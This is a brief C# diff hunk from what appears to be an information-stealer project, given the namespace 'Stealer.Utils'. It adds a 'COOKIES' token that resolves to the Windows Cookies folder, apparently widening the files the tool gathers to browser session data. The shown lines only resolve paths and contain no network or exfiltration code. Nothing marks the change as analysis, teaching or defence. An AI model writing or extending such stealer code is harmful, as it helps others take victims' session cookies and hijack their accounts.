@@ -66,6 +66,8 @@ namespace Stealer.Utils
                     return Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
                 case "COMMONPICTURES":
                     return Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
+                case "COOKIES":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
                 default:
                     // Treat as literal path or fall back to AppData
                     if (Path.IsPathRooted(token)) return token;
